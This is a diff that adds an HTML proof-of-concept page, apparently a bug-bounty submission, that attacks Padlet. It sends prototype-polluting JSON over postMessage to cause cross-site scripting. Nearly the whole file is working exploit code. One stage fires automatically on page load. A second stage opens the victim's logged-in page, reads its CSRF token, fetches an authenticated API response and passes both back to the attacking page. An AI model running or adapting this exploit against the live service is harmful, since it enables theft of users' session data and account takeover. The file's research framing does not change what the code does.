@@ -1,0 +1,74 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>Padlet prototype pollution PoC</title>
+<style>
+ body{font:15px sans-serif;margin:30px;max-width:800px}
+ input{width:100%;padding:8px;font:13px monospace}
+ button{padding:12px 18px;margin-top:10px;background:#c62828;color:#fff;border:0;font-size:15px;cursor:pointer}
+ #log{background:#111;color:#4ade80;padding:12px;font:12px monospace;white-space:pre-wrap;margin-top:14px}
+ iframe{width:100%;height:320px;border:2px solid #c62828;margin-top:14px}
+</style>
+
+<h3>Padlet — prototype pollution to XSS</h3>
+<p>For research purposes only.</p>
+
+<input id="url" value="https://padlet.com/bugbounty019/my-distinguished-padlet-o5ssov1tp99z6j90">
+<button onclick="stage2()">Stage 2 — open real page (allow popups)</button>
+
+<div id="log">stage 1 runs automatically, no click needed</div>
+<iframe id="f"></iframe>
+
+<script>
+const log = m => document.getElementById('log').textContent += "\n" + m;
+const url = () => document.getElementById('url').value.trim();
+
+// Build the message. Must be a hand-written JSON string: JSON.stringify drops __proto__,
+// and only JSON.parse on the receiving side makes it a real key that merge() walks into.
+function payload(js) {
+  const img = '<img src=x onerror="' + ("if(!window.__p){window.__p=1;" + js + "}").replace(/"/g, '&quot;') + '">';
+  return '{"type":"dispatchStateAction","action":"initializeState","payload":{'
+       + '"postAction":{},"user":{"id":1},"wall":{"id":1,"title":"t"},'
+       + '"__proto__":' + JSON.stringify({ innerHTML: img }) + '}}';
+}
+
+// Pollution must land while Vue is still mounting elements. Sending on a tight interval for
+// 8 seconds removes any guesswork about when the store registers and when components mount.
+function fire(getWin, msg) {
+  let n = 0;
+  const id = setInterval(() => {
+    n++;
+    try { getWin().postMessage(msg, '*') } catch(e) { log('! ' + e.message); clearInterval(id); return }
+    if (n === 1) log('sending every 150ms for 8s...');
+    if (n >= 55) { clearInterval(id); log('done (' + n + ' sends)') }
+  }, 150);
+}
+
+window.onmessage = e => { if (typeof e.data === 'string' && e.data.indexOf('XSS') === 0) log('<<< ' + e.data + '  from ' + e.origin) };
+
+// Stage 1 - zero click. Chrome blocks alert() in a cross-origin iframe, so the payload
+// writes into the padlet document instead. That is visible and needs no permission.
+const f = document.getElementById('f');
+f.onload = () => { log('target loaded, starting'); fire(() => f.contentWindow, STAGE1) };
+f.src = url();
+const STAGE1 = payload(
+  "var d=document.createElement('div');" +
+  "d.setAttribute('style','position:fixed;inset:0;z-index:99999;background:#c62828;color:#fff;" +
+  "font:700 26px sans-serif;display:flex;align-items:center;justify-content:center;text-align:center');" +
+  "d.textContent='XSS in '+document.domain;" +
+  "document.documentElement.appendChild(d);" +
+  "parent.postMessage('XSS:'+document.domain,'*');"
+);
+
+// Stage 2 - one click, top-level, so cookies are sent and the session is reachable.
+function stage2() {
+  const w = window.open(url(), 'p' + Date.now(), 'width=1100,height=800');
+  if (!w) return log('! popup blocked');
+  log('opened real page');
+  fire(() => w, payload(
+    "var t=(document.getElementsByName('csrf-token')[0]||{}).content||'none';" +
+    "fetch('/api/1/dashboard/starting-state',{credentials:'same-origin'}).then(r=>r.text())" +
+    ".then(b=>opener.postMessage('XSS2: '+document.domain+' | csrf='+t+' | api='+b.slice(0,200),'*'));" +
+    "alert('XSS on '+document.domain);"
+  ));
+}
+</script>
